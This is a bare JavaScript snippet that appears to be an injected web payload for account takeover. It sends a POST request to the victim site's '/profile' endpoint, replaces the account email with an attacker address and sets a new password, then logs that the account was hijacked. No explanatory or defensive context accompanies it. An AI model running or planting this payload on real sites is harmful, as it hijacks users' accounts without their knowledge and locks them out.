fetch('/profile', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: 'email=hacker@evil.com&password=hacked123'
}).then(response => {
    console.log("Account successfully hijacked!");
});
